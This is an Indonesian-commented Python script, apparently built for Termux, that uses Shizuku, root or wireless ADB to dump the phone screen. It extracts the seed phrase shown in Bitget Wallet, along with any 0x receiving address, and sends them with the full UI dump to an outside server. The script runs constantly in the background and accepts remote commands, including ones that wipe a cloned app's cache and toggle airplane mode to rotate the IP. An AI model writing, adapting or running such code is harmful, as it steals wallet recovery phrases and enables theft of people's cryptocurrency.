#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==================================================================
        TRIO MERAK - SHIZUKU BRIDGE FOR TERMUX (ANDROID)
==================================================================
Jembatan otomatisasi Shizuku (rish) di HP Android untuk:
1. Mengekstrak 12/24 kata Seed Phrase dari layar Bitget Wallet.
2. Mendeteksi Alamat Barcode Penerima (0x...) dari layar Bitget Wallet.
3. Mengirimkan hasil ke Web Server Gateway secara aman lewat internet seluler.

Fitur Otomatisasi:
- Tombol Fisik [VOLUME ATAS] / [VOLUME BAWAH] di HP (Timer 3 detik).
- Tombol [ENTER] di terminal Termux (Timer 4 detik).
- Eksekusi Instan dari tombol Web POS Kasir (Tanpa timer / 0 detik).
- Berjalan 24/7 di latar belakang via PM2 Process Manager.
"""

import os
import sys
import time
import json
import re
import threading
import urllib.request
import urllib.error
import subprocess
import xml.etree.ElementTree as ET

CONFIG_FILE = os.path.expanduser("~/.merak_bridge_config.json")
TRIGGER_FILE = os.path.expanduser("~/.bridge_trigger")
DEBUG_XML_FILE = os.path.expanduser("~/last_dump.xml")
DEBUG_MODE = os.environ.get("BRIDGE_DEBUG", "").lower() in ("1", "true", "yes")

def load_saved_server():
    default_url = "https://triomerak.web.id"
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                url = json.load(f).get("server_url", default_url)
                if "triomerak.web.id" in url:
                    url = "https://triomerak.web.id"
                if not url.startswith("http"):
                    url = "https://" + url
                return url
        except Exception:
            pass
    return default_url

def save_server(url):
    try:
        if "triomerak.web.id" in url:
            url = "https://triomerak.web.id"
        if not url.startswith("http"):
            url = "https://" + url
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({"server_url": url.rstrip("/")}, f)
    except Exception:
        pass

_CACHED_RISH = None

def _has_root():
    """Kembalikan True jika su tersedia dan dapat dieksekusi (device rooted)."""
    try:
        res = subprocess.run(["su", "-c", "id"], capture_output=True, text=True, timeout=5)
        return res.returncode == 0 and "uid=0" in res.stdout
    except Exception:
        return False

def ensure_adb_connected():
    """Cek koneksi ADB lokal (Wireless Debugging Android 11+)."""
    try:
        res = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
        lines = [l for l in (res.stdout or "").strip().splitlines() if "\tdevice" in l]
        if lines:
            return lines[0].split()[0]
        # Coba auto-connect ke localhost:5555
        subprocess.run(["adb", "connect", "localhost:5555"], capture_output=True, text=True, timeout=5)
        res2 = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
        lines2 = [l for l in (res2.stdout or "").strip().splitlines() if "\tdevice" in l]
        if lines2:
            return lines2[0].split()[0]
    except Exception:
        pass
    return None

def get_rish_cmd():
    global _CACHED_RISH
    env = os.environ.copy()
    env["RISH_APPLICATION_ID"] = "com.termux"

    if _CACHED_RISH:
        try:
            res = subprocess.run(_CACHED_RISH + ["-c", "id"], capture_output=True, text=True, timeout=6, env=env)
            out = (res.stdout or "") + (res.stderr or "")
            if "uid=" in out:
                return _CACHED_RISH
            elif DEBUG_MODE:
                print(f"[DEBUG] Cached rish validation failed: {out[:50]}", flush=True)
        except Exception as e:
            if DEBUG_MODE:
                print(f"[DEBUG] Cached rish test error: {e}", flush=True)
            _CACHED_RISH = None

    candidates = [
        ["sh", "/data/data/com.termux/files/usr/bin/rish"],
        ["/data/data/com.termux/files/usr/bin/rish"],
        ["sh", "rish"],
        ["rish"]
    ]
    for c in candidates:
        try:
            res = subprocess.run(c + ["-c", "id"], capture_output=True, text=True, timeout=8, env=env)
            out = (res.stdout or "") + (res.stderr or "")
            if "uid=" in out:
                _CACHED_RISH = c
                if DEBUG_MODE:
                    print(f"[DEBUG] Rish found and cached: {c}", flush=True)
                return c
            elif DEBUG_MODE:
                print(f"[DEBUG] Test {c} -> {out.strip()[:100]}", flush=True)
        except Exception as e:
            if DEBUG_MODE:
                print(f"[DEBUG] Candidate {c} exception: {e}", flush=True)
    
    if DEBUG_MODE:
        print("[DEBUG] ❌ No working rish command found!", flush=True)
    return None

def get_active_backend():
    """
    Deteksi backend eksekusi ADB aktif:
    1. Shizuku (rish) - Non-Root murni
    2. Root (su) - Rooted Android
    3. Wireless ADB (adb shell) - Wireless Debugging
    """
    # 1. Cek Shizuku
    rish = get_rish_cmd()
    if rish:
        return "SHIZUKU", rish
    # 2. Cek Root
    if _has_root():
        return "ROOT", ["su", "-c"]
    # 3. Cek Wireless ADB
    adb_dev = ensure_adb_connected()
    if adb_dev:
        return "WIRELESS_ADB", ["adb", "shell"]
    return "NONE", None

def exec_adb_cmd(cmd_str, timeout=30):
    """
    Eksekusi perintah Android via backend terbaik yang aktif.
    Returns: (success: bool, output: str, backend: str, error: str)
    """
    backend, runner = get_active_backend()
    env = os.environ.copy()
    env["RISH_APPLICATION_ID"] = "com.termux"

    if backend == "SHIZUKU":
        try:
            res = subprocess.run(runner + ["-c", cmd_str], capture_output=True, text=True, timeout=timeout, env=env)
            out = (res.stdout or "").strip()
            err = (res.stderr or "").strip()
            return (res.returncode == 0 or bool(out)), out, "SHIZUKU", err
        except subprocess.TimeoutExpired:
            return False, "", "SHIZUKU", f"Timeout {timeout}s"
        except Exception as e:
            return False, "", "SHIZUKU", str(e)

    elif backend == "ROOT":
        try:
            res = subprocess.run(["su", "-c", cmd_str], capture_output=True, text=True, timeout=timeout)
            out = (res.stdout or "").strip()
            err = (res.stderr or "").strip()
            return (res.returncode == 0 or bool(out)), out, "ROOT", err
        except subprocess.TimeoutExpired:
            return False, "", "ROOT", f"Timeout {timeout}s"
        except Exception as e:
            return False, "", "ROOT", str(e)

    elif backend == "WIRELESS_ADB":
        try:
            res = subprocess.run(["adb", "shell", cmd_str], capture_output=True, text=True, timeout=timeout)
            out = (res.stdout or "").strip()
            err = (res.stderr or "").strip()
            return (res.returncode == 0 or bool(out)), out, "WIRELESS_ADB", err
        except subprocess.TimeoutExpired:
            return False, "", "WIRELESS_ADB", f"Timeout {timeout}s"
        except Exception as e:
            return False, "", "WIRELESS_ADB", str(e)

    return False, "", "NONE", "Tidak ada backend aktif (Shizuku, Root, atau Wireless ADB belum terhubung)"

def exec_shizuku_cmd(cmd_str, timeout=25):
    """Fungsi pembungkus kompatibilitas ke exec_adb_cmd."""
    _, out, _, _ = exec_adb_cmd(cmd_str, timeout=timeout)
    return out

def get_foreground_app():
    try:
        out = exec_shizuku_cmd("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")
        if not out:
            out = exec_shizuku_cmd("dumpsys activity activities | grep -E 'mResumedActivity'")
        return out.strip()
    except Exception:
        return ""

def dump_ui_xml():
    """Dump UI XML dengan multiple fallback paths dan error handling."""
    # 1. Coba /sdcard/dump.xml (paling reliable di banyak device)
    exec_shizuku_cmd("rm -f /sdcard/dump.xml", timeout=5)
    result = exec_shizuku_cmd("uiautomator dump /sdcard/dump.xml", timeout=20)
    if DEBUG_MODE:
        print(f"[DEBUG] uiautomator dump result: {result[:100] if result else 'empty'}", flush=True)
    
    time.sleep(0.5)  # Wait for file write to complete
    
    # Verify file exists and get size
    file_check = exec_shizuku_cmd("ls -lh /sdcard/dump.xml 2>/dev/null", timeout=5)
    if DEBUG_MODE:
        print(f"[DEBUG] File check: {file_check}", flush=True)
    
    xml_data = exec_shizuku_cmd("cat /sdcard/dump.xml 2>/dev/null", timeout=10)
    if xml_data and "<hierarchy" in xml_data:
        if DEBUG_MODE:
            print(f"[DEBUG] ✅ XML loaded from /sdcard/dump.xml ({len(xml_data)} bytes)", flush=True)
        return xml_data

    # 2. Coba default uiautomator dump (/sdcard/window_dump.xml)
    exec_shizuku_cmd("rm -f /sdcard/window_dump.xml", timeout=5)
    exec_shizuku_cmd("uiautomator dump", timeout=20)
    time.sleep(0.5)
    
    file_check = exec_shizuku_cmd("ls -lh /sdcard/window_dump.xml 2>/dev/null", timeout=5)
    if DEBUG_MODE:
        print(f"[DEBUG] File check window_dump: {file_check}", flush=True)
    
    xml_data = exec_shizuku_cmd("cat /sdcard/window_dump.xml 2>/dev/null", timeout=10)
    if xml_data and "<hierarchy" in xml_data:
        if DEBUG_MODE:
            print(f"[DEBUG] ✅ XML loaded from /sdcard/window_dump.xml ({len(xml_data)} bytes)", flush=True)
        return xml_data

    # 3. Coba dengan permission fix
    exec_shizuku_cmd("uiautomator dump /sdcard/dump.xml", timeout=20)
    exec_shizuku_cmd("chmod 644 /sdcard/dump.xml", timeout=5)
    time.sleep(0.5)
    
    xml_data = exec_shizuku_cmd("cat /sdcard/dump.xml 2>/dev/null", timeout=10)
    if xml_data and "<hierarchy" in xml_data:
        if DEBUG_MODE:
            print(f"[DEBUG] ✅ XML loaded after chmod ({len(xml_data)} bytes)", flush=True)
        return xml_data

    if DEBUG_MODE:
        print("[DEBUG] ❌ Semua fallback path gagal. UIAutomator mungkin tidak support device ini.", flush=True)
        # Try to read any file content for debugging
        test_read = exec_shizuku_cmd("head -c 200 /sdcard/dump.xml 2>/dev/null || echo 'cannot read'", timeout=5)
        print(f"[DEBUG] Test read first 200 bytes: {test_read}", flush=True)
    
    return ""

def parse_seed_phrase_from_xml(xml_text, debug=False):
    if not xml_text or "<hierarchy" not in xml_text:
        if debug:
            print("[DEBUG] XML kosong atau tidak valid", flush=True)
        return []

    try:
        root = ET.fromstring(xml_text)
    except Exception as e:
        if debug:
            print(f"[DEBUG] Error parsing XML: {e}", flush=True)
        return []

    raw_nodes = []
    for node in root.iter('node'):
        t = (node.get('text') or '').strip()
        cd = (node.get('content-desc') or '').strip()
        res_id = (node.get('resource-id') or '').strip()
        
        if t:
            raw_nodes.append(t)
            if debug and len(t) < 100:  # Hindari print string terlalu panjang
                print(f"[DEBUG] Text node: '{t}' (resource-id: {res_id})", flush=True)
        if cd and cd != t:
            raw_nodes.append(cd)
            if debug and len(cd) < 100:
                print(f"[DEBUG] ContentDesc node: '{cd}' (resource-id: {res_id})", flush=True)

    if debug:
        print(f"\n[DEBUG] Total nodes ditemukan: {len(raw_nodes)}", flush=True)

    words = []
    # Format 1: "1\nword" atau "01. word" dalam satu node
    for item in raw_nodes:
        lines = [x.strip() for x in item.splitlines() if x.strip()]
        if len(lines) == 2 and lines[0].replace('.','').isdigit() and lines[1].replace('.','').isalpha():
            word = lines[1].lower()
            words.append(word)
            if debug:
                print(f"[DEBUG] Format 1 detected: {lines[0]} -> {word}", flush=True)
        elif len(lines) == 1:
            parts = lines[0].split()
            if len(parts) == 2 and parts[0].replace('.', '').isdigit() and parts[1].isalpha():
                word = parts[1].lower()
                words.append(word)
                if debug:
                    print(f"[DEBUG] Format 1b detected: {parts[0]} {word}", flush=True)

    if len(words) in (12, 24):
        if debug:
            print(f"[DEBUG] ✅ Format 1 berhasil: {len(words)} kata", flush=True)
        return words

    # Format 2: Node terpisah bersebelahan: Node 1 bernilai angka "1", Node 2 bernilai kata "apple"
    adj_words = []
    i = 0
    while i < len(raw_nodes) - 1:
        n1 = raw_nodes[i].strip().replace('.', '').replace(',', '')
        n2 = raw_nodes[i+1].strip().lower()
        if n1.isdigit() and 1 <= int(n1) <= 24 and n2.isalpha() and 2 <= len(n2) <= 15:
            adj_words.append(n2)
            if debug:
                print(f"[DEBUG] Format 2 detected: {n1} + {n2}", flush=True)
            i += 2
        else:
            i += 1
    if len(adj_words) in (12, 24):
        if debug:
            print(f"[DEBUG] ✅ Format 2 berhasil: {len(adj_words)} kata", flush=True)
        return adj_words

    # Format 3: Kandidat kata murni (BIP-39 filter) - dengan uppercase handling
    ignore = {
        "cadangkan", "tuliskan", "sembunyikan", "teruskan", "batal",
        "lanjut", "kembali", "opsi", "setelan", "tentang", "wallet",
        "phrase", "seed", "backup", "copy", "salin", "lanjutkan",
        "ok", "done", "next", "confirm", "konfirmasi", "view", "show",
        "peringatan", "warning", "mnemonic", "private", "key", "keamanan",
        "security", "saya", "telah", "menyimpan", "mengerti", "paham", "got",
        "continue", "skip", "close", "cancel", "accept", "agree", "understand",
        "bitget", "app", "menu", "home", "back", "forward", "settings",
        "open", "tap", "press", "swipe", "scroll", "refresh", "reload"
    }
    cand = []
    for item in raw_nodes:
        for part in item.split():
            clean = part.strip().lower()
            # Remove trailing punctuation
            clean = re.sub(r'[.,;:!?\'"]+$', '', clean)
            if clean.isalpha() and 2 <= len(clean) <= 15 and clean not in ignore:
                if clean not in cand:  # Avoid duplicates
                    cand.append(clean)
                    if debug:
                        print(f"[DEBUG] Kandidat kata: '{clean}'", flush=True)
    
    if debug:
        print(f"\n[DEBUG] Total kandidat kata: {len(cand)}", flush=True)
        
    if len(cand) in (12, 24):
        if debug:
            print(f"[DEBUG] ✅ Format 3 berhasil: {len(cand)} kata", flush=True)
        return cand
    
    # Format 4: Fallback - ambil 12/24 kata pertama yang valid jika mendekati target
    if 10 <= len(cand) <= 14 or 22 <= len(cand) <= 26:
        target_count = 12 if len(cand) < 18 else 24
        filtered = cand[:target_count]
        if debug:
            print(f"[DEBUG] ⚠️ Format 4 fallback: {len(filtered)} dari {len(cand)} kata", flush=True)
        return filtered

    if debug:
        print(f"[DEBUG] ❌ Tidak ditemukan pola yang sesuai. Total kata: {len(words)}, Adjacent: {len(adj_words)}, Candidates: {len(cand)}", flush=True)
    
    return words

def parse_address_from_xml(xml_text):
    if not xml_text:
        return None
    matches = re.findall(r"0x[a-fA-F0-9]{40}", xml_text)
    return matches[0] if matches else None

def send_to_server(server_url, data_type, value, max_retries=10, xml_data=None):
    endpoint = server_url.rstrip("/") + "/api/bridge/report"
    payload = {
        "type": data_type,
        "value": value,
        "agent": "Termux-Shizuku"
    }
    
    # Include XML for debugging if provided
    if xml_data and data_type == "phrase":
        payload["xml_dump"] = xml_data
    
    payload_bytes = json.dumps(payload).encode("utf-8")

    req = urllib.request.Request(
        endpoint,
        data=payload_bytes,
        headers={"Content-Type": "application/json", "User-Agent": "TrioMerakBridge/1.0"}
    )

    print(f"[*] Mengirim {data_type} ke server: {endpoint}...", flush=True)
    for attempt in range(1, max_retries + 1):
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                if resp.status == 200:
                    resp_json = json.loads(resp.read().decode("utf-8"))
                    print(f"✅ [SUKSES] Berhasil diterima Server! ({resp_json.get('time', '')})", flush=True)
                    return True
        except Exception as e:
            print(f"[-] Percobaan {attempt}/{max_retries} tertunda (Menunggu data seluler aktif): {e}", flush=True)
            time.sleep(2)
    print("❌ [GAGAL] Tidak dapat menghubungi server setelah beberapa kali percobaan.", flush=True)
    return False

# ==============================================================================
# EKSEKUSI EXTRACTION & TIMERS
# ==============================================================================
_extract_lock = threading.Lock()
_is_extracting = False

def do_extract(server_url, with_timer=False, trigger_source=""):
    """
    Eksekusi ekstraksi layar HP.
    Jika with_timer=True: delay 3-4 detik.
    Jika with_timer=False: TANPA delay (0s).
    """
    global _is_extracting

    with _extract_lock:
        if _is_extracting:
            print("[!] Sedang proses ekstraksi sebelumnya, abaikan trigger ganda.", flush=True)
            return
        _is_extracting = True

    try:
        countdown_secs = 4 if "ENTER" in trigger_source else 3
        if with_timer:
            print("\n" + "=" * 60, flush=True)
            print(f"⚡ [TRIGGER: {trigger_source}]", flush=True)
            print(f"⏳ Menghitung mundur {countdown_secs} detik... Pastikan layar 12 kata Bitget terbuka!", flush=True)
            print("=" * 60, flush=True)
            for sec in range(countdown_secs, 0, -1):
                print(f"👉 Eksekusi dalam {sec} detik...", flush=True)
                time.sleep(1)
            print("🚀 [MEMBACA LAYAR HP SEKARANG]...", flush=True)
        else:
            print(f"\n🚀 [PERINTAH DARI WEB POS: {trigger_source}] Mengekstrak layar instan (Tanpa timer)...", flush=True)

        # Cek aplikasi yang sedang di depan layar
        fg_app = get_foreground_app()
        if "com.termux" in fg_app:
            print("⚠️ PERINGATAN: Layar HP saat ini sedang menampilkan aplikasi TERMUX!", flush=True)
            print("👉 Segera beralih ke aplikasi Bitget Wallet pada halaman 12 kata!", flush=True)

        xml_data = dump_ui_xml()
        xml_len = len(xml_data)

        if not xml_data:
            print("❌ Gagal membaca dump UI layar HP (0 bytes)!", flush=True)
            print("   Pastikan service Shizuku di HP aktif dan Termux memiliki izin.", flush=True)
            return

        # Simpan XML untuk debugging
        try:
            with open(DEBUG_XML_FILE, "w", encoding="utf-8") as f:
                f.write(xml_data)
            if DEBUG_MODE:
                print(f"[DEBUG] XML disimpan ke: {DEBUG_XML_FILE}", flush=True)
        except Exception as e:
            if DEBUG_MODE:
                print(f"[DEBUG] Gagal menyimpan XML: {e}", flush=True)

        # Parse dengan debug mode
        words = parse_seed_phrase_from_xml(xml_data, debug=DEBUG_MODE)

        if len(words) in (12, 24):
            phrase = " ".join(words)
            print(f"✅ Ditemukan {len(words)} kata Seed Phrase:", flush=True)
            print(f"🔑 {phrase}", flush=True)
            send_to_server(server_url, "phrase", phrase, xml_data=xml_data)
            print("🎉 Dompet otomatis terhubung di Web POS Kasir!", flush=True)
        else:
            # Cek apakah sedang membuka barcode penerima
            addr = parse_address_from_xml(xml_data)
            if addr:
                print(f"✅ Alamat Barcode Penerima Terdeteksi:", flush=True)
                print(f"📱 {addr}", flush=True)
                send_to_server(server_url, "address", addr)
                print("🎉 Alamat penerima berhasil dikirim ke Web POS!", flush=True)
            else:
                print(f"❌ Tidak ditemukan 12 kata atau alamat barcode di layar.", flush=True)
                print(f"   📊 Statistik: XML={xml_len} bytes, Kata={len(words)}", flush=True)
                if "com.bitget" not in fg_app.lower() and "bitget" not in fg_app.lower():
                    print(f"   ⚠️  Aplikasi saat ini: {fg_app[:80] if fg_app else 'Unknown'}", flush=True)
                    print(f"   👉 Buka aplikasi Bitget Wallet dan tampilkan layar 12 kata Seed Phrase!", flush=True)
                else:
                    print(f"   💡 Pastikan Anda sedang di halaman Seed Phrase (bukan PIN/Password/Home).", flush=True)
                    print(f"   🔍 Debug: Jalankan 'export BRIDGE_DEBUG=1' lalu coba lagi untuk detail.", flush=True)
                print(f"   📂 XML dump tersimpan di: {DEBUG_XML_FILE}", flush=True)

        print("\n" + "─" * 60, flush=True)
        print("✨ SIAP UNTUK AKUN BERIKUTNYA!", flush=True)
        print("   Tekan [ENTER] di Termux atau tombol [VOLUME UP / DOWN] di HP.", flush=True)
        print("─" * 60, flush=True)

    except Exception as err:
        print(f"❌ Error ekstraksi: {err}", flush=True)
    finally:
        with _extract_lock:
            _is_extracting = False

# ==============================================================================
# BACKGROUND LISTENERS: VOLUME KEYS, FILE TRIGGER (ENTER), & WEB POLL
# ==============================================================================
def listen_volume_keys(server_url):
    """Mendengarkan event tombol fisik Volume Up & Volume Down di HP via getevent."""
    env = os.environ.copy()
    env["RISH_APPLICATION_ID"] = "com.termux"

    while True:
        rish = get_rish_cmd()
        if not rish:
            time.sleep(3)
            continue

        try:
            # Gunakan PTY jika tersedia di Termux agar getevent tidak menahan output dalam buffer C 4KB
            try:
                import pty
                master, slave = pty.openpty()
                proc = subprocess.Popen(
                    rish + ["-c", "getevent -l"],
                    stdin=slave,
                    stdout=slave,
                    stderr=slave,
                    env=env,
                    close_fds=True
                )
                os.close(slave)
                out_stream = open(master, "r", encoding="utf-8", errors="ignore")
            except Exception:
                proc = subprocess.Popen(
                    rish + ["-c", "getevent -l"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                    bufsize=1,
                    env=env
                )
                out_stream = proc.stdout

            print("🎧 Listener tombol fisik Volume HP aktif & siap!", flush=True)

            for line in out_stream:
                if not line:
                    break
                line_up = line.upper()
                if "KEY_VOLUMEUP" in line_up or "KEY_VOLUMEDOWN" in line_up or " 0072 " in line or " 0073 " in line:
                    if "DOWN" in line_up or " 00000001" in line:
                        btn_name = "VOLUME ATAS" if ("UP" in line_up or " 0073 " in line) else "VOLUME BAWAH"
                        print(f"\n👉 [TOMBOL FISIK HP TERDETEKSI: {btn_name}]", flush=True)
                        threading.Thread(target=do_extract, args=(server_url, True, btn_name), daemon=True).start()

        except Exception:
            time.sleep(2)

def listen_file_trigger(server_url):
    """Mendengarkan trigger file ~/.bridge_trigger (dipicu saat tombol ENTER ditekan di Termux)."""
    while True:
        try:
            if os.path.exists(TRIGGER_FILE):
                try:
                    os.remove(TRIGGER_FILE)
                except Exception:
                    pass
                print("\n👉 [TOMBOL ENTER TERMUX TERDETEKSI]", flush=True)
                threading.Thread(target=do_extract, args=(server_url, True, "ENTER TERMUX"), daemon=True).start()
        except Exception:
            pass
        time.sleep(0.4)

def listen_stdin_enter(server_url):
    """Mendengarkan penekanan tombol ENTER di terminal jika berjalan di foreground."""
    while True:
        try:
            line = sys.stdin.readline()
            if not line:
                time.sleep(1)
                continue
            threading.Thread(target=do_extract, args=(server_url, True, "TOMBOL ENTER"), daemon=True).start()
        except Exception:
            time.sleep(1)

def do_reset_multi_app(server_url):
    """Eksekusi 5 tahap atomic reset Multi App & Jaringan via Shizuku/Root/Wireless ADB."""
    package_name = "com.waxmoon.ma.gp"
    shell_script = (
        f"am force-stop {package_name}; "
        f"am force-stop {package_name}:core; "
        f"am force-stop {package_name}:clone; "
        f"rm -rf /sdcard/Android/data/{package_name}/cache/*; "
        f"rm -rf /data/data/{package_name}/cache/*; "
        f"rm -rf /data/data/{package_name}/code_cache/*; "
        f"cmd connectivity airplane-mode enable; "
        f"settings put global airplane_mode_on 1; "
        f"am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true; "
        f"sleep 2; "
        f"cmd connectivity airplane-mode disable; "
        f"settings put global airplane_mode_on 0; "
        f"am broadcast -a android.intent.action.AIRPLANE_MODE --ez state false; "
        f"sleep 2; "
        f"monkey -p {package_name} -c android.intent.category.LAUNCHER 1"
    )
    print("\n" + "=" * 60, flush=True)
    print("🚀 [PERINTAH SERVER: RESET MULTI APP & JARINGAN]", flush=True)
    print("=" * 60, flush=True)
    success, out, backend, err = exec_adb_cmd(shell_script, timeout=35)
    if success:
        print(f"✅ Rangkaian Reset Multi App Selesai Dieksekusi via {backend}!", flush=True)
    else:
        print(f"⚠️ Eksekusi selesai dengan catatan via {backend}: {err}", flush=True)
    
    # Beri jeda 2 detik agar koneksi data seluler kembali online setelah mode pesawat
    time.sleep(2)
    send_to_server(server_url, "reset_result", json.dumps({
        "success": success or bool(out),
        "backend": backend,
        "output": out,
        "error": err
    }))

def do_toggle_airplane(server_url):
    """Toggle mode pesawat ON -> sleep 2 -> OFF via Shizuku/Root/Wireless ADB."""
    shell_script = (
        "cmd connectivity airplane-mode enable; "
        "settings put global airplane_mode_on 1; "
        "am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true; "
        "sleep 2; "
        "cmd connectivity airplane-mode disable; "
        "settings put global airplane_mode_on 0; "
        "am broadcast -a android.intent.action.AIRPLANE_MODE --ez state false;"
    )
    print("\n" + "=" * 60, flush=True)
    print("✈️ [PERINTAH SERVER: TOGGLE MODE PESAWAT (RESET IP)]", flush=True)
    print("=" * 60, flush=True)
    success, out, backend, err = exec_adb_cmd(shell_script, timeout=20)
    if success:
        print(f"✅ Mode Pesawat Berhasil Di-toggle via {backend} (IP Ter-reset)!", flush=True)
    else:
        print(f"⚠️ Toggle selesai dengan catatan via {backend}: {err}", flush=True)
    
    time.sleep(2)
    send_to_server(server_url, "airplane_result", json.dumps({
        "success": success or bool(out),
        "backend": backend,
        "output": out,
        "error": err
    }))

def listen_web_poll(server_url):
    """Mendengarkan instruksi perintah dari Web POS Kasir / Telegram Bot."""
    poll_endpoint = server_url.rstrip("/") + "/api/bridge/poll"
    while True:
        try:
            req = urllib.request.Request(
                poll_endpoint,
                headers={"User-Agent": "TrioMerakBridge/1.0"}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                cmd = data.get("command")
                if cmd == "RESET_MULTI_APP":
                    threading.Thread(target=do_reset_multi_app, args=(server_url,), daemon=True).start()
                elif cmd == "TOGGLE_AIRPLANE":
                    threading.Thread(target=do_toggle_airplane, args=(server_url,), daemon=True).start()
                elif cmd in ("EXTRACT_PHRASE", "DETECT_ADDRESS"):
                    threading.Thread(target=do_extract, args=(server_url, False, f"KLIK WEB POS ({cmd})"), daemon=True).start()
        except Exception:
            pass
        time.sleep(1)

def main():
    server_url = load_saved_server()
    if "--server" in sys.argv:
        idx = sys.argv.index("--server")
        if idx + 1 < len(sys.argv):
            server_url = sys.argv[idx + 1]
            if not server_url.startswith("http"):
                server_url = "https://" + server_url
            save_server(server_url)

    if "--trigger" in sys.argv or "--extract" in sys.argv:
        try:
            with open(TRIGGER_FILE, "w") as f:
                f.write("1")
            print("✅ Trigger ekstraksi berhasil dikirim ke background bridge!")
        except Exception as e:
            print(f"❌ Gagal mengirim trigger: {e}")
        return

    backend, runner = get_active_backend()

    print("=" * 60, flush=True)
    print("   TRIO MERAK - SHIZUKU / ADB BRIDGE RUNNER FOR TERMUX", flush=True)
    print("=" * 60, flush=True)
    if backend == "SHIZUKU":
        print(f"✅ Akses Shizuku (rish) Aktif : {' '.join(runner)}", flush=True)
    elif backend == "ROOT":
        print(f"✅ Akses Root (su) Aktif     : {' '.join(runner)}", flush=True)
    elif backend == "WIRELESS_ADB":
        print(f"✅ Akses Wireless ADB Aktif  : {' '.join(runner)}", flush=True)
    else:
        print("⚠️ Akses Shizuku / Root / Wireless ADB belum terdeteksi!", flush=True)
        print("   💡 Panduan Cepat:", flush=True)
        print("   1. Buka aplikasi Shizuku di HP -> Pastikan 'Shizuku is running'", flush=True)
        print("   2. Buka menu 'Authorized applications' -> Centang Termux", flush=True)
        print("   3. Atau gunakan menu [1] di run.sh untuk Wireless Debugging", flush=True)
    print(f"🌐 Server Target Web Gateway : {server_url}", flush=True)
    print("=" * 60, flush=True)
    print("⚡ SHORTCUT EKSTRAKSI CEPAT:", flush=True)
    print("  👉 Tekan Tombol [VOLUME ATAS / BAWAH] di HP (Timer 3s)", flush=True)
    print("  👉 Tekan [ENTER] di Termux (Timer 4s)", flush=True)
    print("  👉 Klik [Ambil Phrase] di Web POS Kasir (Instan)", flush=True)
    print("  👉 Tekan Ctrl + C untuk keluar dari log", flush=True)
    print("=" * 60, flush=True)
    print("🟢 Bridge aktif & standby 24/7 di background (PM2)...\n", flush=True)

    # Jalankan listener di thread terpisah
    threading.Thread(target=listen_volume_keys, args=(server_url,), daemon=True).start()
    threading.Thread(target=listen_web_poll, args=(server_url,), daemon=True).start()
    threading.Thread(target=listen_file_trigger, args=(server_url,), daemon=True).start()

    # Jika berjalan di foreground dengan TTY, pasang juga listener stdin
    if sys.stdin and sys.stdin.isatty():
        try:
            listen_stdin_enter(server_url)
        except KeyboardInterrupt:
            print("\n\n[*] Bridge dihentikan oleh pengguna. Sampai jumpa!")
            return

    # Loop utama background process
    try:
        while True:
            time.sleep(2)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
